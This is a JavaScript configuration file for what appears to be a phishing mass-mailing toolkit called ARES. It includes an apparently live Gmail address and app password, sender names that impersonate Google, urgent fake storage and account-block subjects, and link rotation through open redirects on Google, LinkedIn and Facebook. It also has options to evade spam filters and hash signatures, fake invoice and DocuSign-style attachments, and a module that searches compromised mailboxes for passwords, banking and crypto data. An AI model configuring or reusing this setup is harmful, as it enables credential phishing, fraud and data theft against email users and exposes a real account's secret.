#!/usr/bin/env node

/**
 * SECTION 1: SMTP & CLOUD API CREDENTIALS
 */
const smtp = [
 {
    "host": "smtp.gmail.com", // The SMTP server address
    "port": 587, // Port number (usually 587 for TLS or 465 for SSL)
    "secure": false, // Set to true for SSL (port 465), false for TLS/STARTTLS
    "username": "madnan2173ilove@gmail.com", // SMTP login username/email
    "password": "tcax tngm zaib lqzy", // SMTP password or App Password
    "from_email": "madnan2173ilove@gmail.com", // The email address that appears as the sender
    
    "tested": "2026-02-13T13:30:24.530Z", // Last successful internal test timestamp
    "tested_at": "2026-03-16T13:04:20.815Z" // Last verification attempt timestamp
  },
];

/**
 * SECTION 1: OWA & GRAPH API CREDENTIALS
 */
const graph_api = {
  active: false, // Set true to prioritize Microsoft Graph API delivery over SMTP
  clientId: "YOUR_AZURE_CLIENT_ID", // Azure Application Client ID
  tenantId: "YOUR_TENANT_ID", // Azure Directory Tenant ID
  clientSecret: "YOUR_CLIENT_SECRET", // Azure Application Client Secret
  tokenPath: "./tokens.json", // Path where OAuth2 authentication tokens are stored
  useAdminConnector: false, // Uses administrative permissions for high-speed delivery
};

/**
 * SECTION 2: GLOBAL DELIVERY CONTROLLER
 */
const setup = {
  key: "key", // License key for script authorization
  MultipleSmtp: "ROTATE", // Use 'ROTATE' to switch accounts or 'SINGLE' for one
  mail_priority: "HIGH", // Email header priority (HIGH, NORMAL, LOW)
  sleep_time: 3, // Delay in seconds between sending attempts
  sleep_after_count: 5, // Pause the script after sending this many emails
  isMultiThread: false, // Enable multi-threading for significantly faster delivery
  howManyThread: 10, // Number of simultaneous worker threads to spawn
  
  // --- CLOUD MANAGEMENT ---
  general_reset_token: false, // Force reset/refresh of API session tokens
  manage_cloud_accounts: false, // Enable management interface for cloud API accounts

  // --- CONTENT DECEPTION & RENDERING ---
  LetterToImage: false, // Convert HTML email body into an image to bypass filters
  fileName_LetterToImage: "./letterToImage.html", // HTML source file for image rendering
  width_imageLetter: 800, // Resolution width of the rendered browser window
  height_imageLetter: 1000, // Resolution height of the rendered browser window
  width_imageLetter_2: "100%", // Display width of the rendered image in the email
  height_imageLetter_2: "auto", // Display height of the rendered image in the email
  use_multiple_letters: false, // Randomly pick from a list of HTML templates
  letter: "letter.html", // Default HTML template file
  
  // --- SENDER & SUBJECT ROTATION ---
  use_noreply: false, // Override sender to show a randomized "noreply@domain" address
  from_name: "<RANDNUM5>", // Default sender name (supports random macros)
  mail_subject: "<RANDNUM4>", // Default email subject (supports random macros)

  multiple_fromName: true, // Enable rotation of sender names
  multi_FromName: [ // List of sender names to rotate randomly
    "Google Storage",
    "Gmail Support",
    "Google Cloud Team",
    "Google Account Services",
    "Account Notification"
  ],
 multiple_subject: true, // Enable rotation of email subjects
  multi_subject: [ // List of subjects to rotate randomly
    "Your Gmail will stop working in 2 days",
    "Action Required: Your Google Storage is Full (15 GB)",
    "Final Notice: Incoming emails are being blocked",
    "Storage Limit Reached: Upgrade to 100 GB now",
    "System Alert: Service expiration for <%= EMAIL %>",
    "Urgent: Resolve your Google account storage issue"
  ],

  multiple_links: [ // List of URLs to be picked randomly for tags like <%= RANDLINK %>
    "https://link-one.com/secure",
    "https://link-two.com/verify",
    "https://link-3.com/portal",
    "https://link-4.com/login"
  ],

  // --- HYBRID SENDER FEATURES (ARES UPDATED) ---
  test_frommail: false, // Enable testing mode for the frommail list
  frommail_filename: "frommail.txt", // File containing custom "From" addresses
  hide_frommail: false, // Masks the actual sender address using header manipulation
  use_hybrid_mode: false, // Alternates between SMTP and Cloud API automatically
  
  // --- DELIVERY LOGISTICS ---
  email_test: false, // Send a copy to the test destination every X emails
  test_every: 3, // Frequency of test emails
  email_destination: "asd@asd.com", // The email address to receive test copies
  mailist: "mailist.txt", // The file containing your target recipient list
  
  // --- ASSETS & BRANDING ---
  useAttachment: true, // Enable file attachments
  useGrabLogo: false, // Automatically fetch the logo of the recipient's company
  logoWidth: "450px", // CSS width for the grabbed logo
  logoMaxWidth: "500px", // CSS max-width for the grabbed logo
  logoPadding: "10px", // CSS padding around the logo
  defaultLogo: "https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31", // Fallback logo URL
  useMylogo: false, // Use your custom fixed logo from the myLOGO section
  proxy: "" // SOCKS5 proxy URL (e.g., socks5://user:pass@host:port)
};

/**
 * SECTION 3: ADVANCED MODULES (ARES TOOLKIT ADDONS)
 */

// NEW FEATURE: Mailbox Extractor & Searcher
const mailbox_extractor = {
  active: false, // Enable searching and extracting data from incoming mailboxes
  keywords: ["invoice", "payment", "bank", "password", "login", "crypto"], // Target search terms
  auto_download_attachments: true, // Automatically save files found in searched emails
  output_folder: "./extracted_data", // Destination folder for saved data
  search_depth_days: 30 // Look back this many days in the mailbox
};

// NEW FEATURE: Advanced Open Redirect Scanner
const open_redirect_scanner = {
  active: false, // Enable open-redirect URL generator to hide target links
  provider_list: [ // List of trusted domains used for redirection
    "https://google.com/url?q=",
    "https://linkedin.com/redir/redirect?url=",
    "https://facebook.com/l.php?u="
  ],
  use_auto_scan: false, // Automatically verify if redirect providers are still working
  obfuscation_level: "HIGH" // Encoding intensity for links to dodge security scanners
};

const calendar_invite = {
  active: false, // Enable sending calendar invites to appear in user's schedules
  TIMEZONE: "America/Adak", // Timezone for the event
  SUMMARY: "Urgent: Payment Update", // Calendar event title
  DESCRIPTION: "Please review the attached document regarding your recent transaction.", // Event body text
  LOCATION: "<DOMAIN>", // Event location field (macro supported)
  METHOD: "REQUEST", // ICS method (REQUEST, PUBLISH, etc.)
  STATUS: "CONFIRMED", // Event status (CONFIRMED, TENTATIVE)
  ORGANIZER_CN: "Billing Dept", // Name of the event organizer
  ORGANIZER_EMAIL: "<EMAIL>", // Email of the event organizer
  START_DATE: "01/07/2026", // Start date in DD/MM/YYYY format
  START_TIME: "10:30", // Start time in 24-hour format
  DURATION_MINUTES: 15 // Duration of the event
};

const attachment_EML = {
  use_EML: false, // Attach an EML file (email within an email)
  attachment_name_EML: "<COMPANYNAME>.eml", // Filename for the EML attachment
  subject_eml: "Notification from <COMPANYNAME>", // Internal subject of the EML
  from_email_eml: "DocuSign-Signature", // Internal sender name of the EML
  letter_eml: "EML/letter.html", // Source HTML for the EML body
  useAttachment_EML: true, // Enable extra attachments inside the EML itself
  attachment: [{ attachmentName: "<COMPANYNAME>.html", path: "EML/attachment.html" }] // Sub-attachment list
};

const attachment = [
  {
    filename: "Invoice_<RANDNUM5>.pdf", // Name of the attached file
    path: "attachment.html", // Source HTML file for the attachment
    attachmentToPdf: true, // Automatically convert HTML source to a PDF file
    encryptLevel: 10, // Complexity level of content obfuscation
    pdfWidth: "800px", // Custom width of the generated PDF page
    pdfHeight: "1100px", // Custom height of the generated PDF page
    injectBinaryNoise: true // Modifies file hash on every send to prevent signature detection
  }
];


const generate_QRCODE = {
  activate: false, // Generate a unique QR code in the email
  link: "https://google.com?q=<EMAIL>", // URL encoded inside the QR code
  width: "200", // Image width in pixels
  height: "200" // Image height in pixels
};

/**
 * SECTION 4: MACROS & SYSTEM CORE SETTINGS
 */
const generate_random_number = [
  { name: "RANDNUM1", length_value: 1 }, // Macro for a 1-digit random number
  { name: "RANDNUM4", length_value: 4 }, // Macro for a 4-digit random number
  { name: "RANDNUM5", length_value: 5 }  // Macro for a 5-digit random number
];

const generate_random_string = [
  { name: "RANDSTRING1", length_value: 5, type: "UPPERCASE" } // Macro for a 5-letter uppercase string
];

const setup_time_date = {
  time_zone: "America/Adak", // Global timezone for date macros
  time_format_lang: "en" // Language for date/time formatting
};

const others = {
  change_ip: false, // Enable manual or automatic IP rotation module
  letterImageName: "tve.png", // Filename used for the LetterToImage screenshot
  cid: "JOKDIGLAFGAE", // Custom Content-ID prefix for inline images
  AutoLogin: true, // Enable automatic login/session restoration
  rejectUnauthorized: false, // Ignore SSL certificate errors (useful for some proxies/SMTPs)
  att_CT: "text/html", // Default Content-Type for attachments
  hybrid_priority: "CLOUD_FIRST" // Priority mode for Hybrid Sender (SMTP vs Cloud API)
};

const myLOGO = [{ function_name: "MYLOGO", nameFile: "https://drive.google.com/uc?id=1oMBVsQBm4ooCDJHc6JoIk3MNpsufMbQN" }]; // Configuration for custom brand logo

/**
 * EXPORT MODULE
 */
module.exports = {
  smtp, 
  setup, 
  graph_api, 
  generate_random_number, 
  generate_random_string, 
  setup_time_date, 
  attachment, 
  myLOGO, 
  attachment_EML, 
  others, 
  generate_QRCODE, 
  calendar_invite,
  redirect_link: { useRedirect: false, key: "tes1", enc_email: "c" }, // Settings for legacy redirect module
  mailbox_extractor,
  open_redirect_scanner 
};
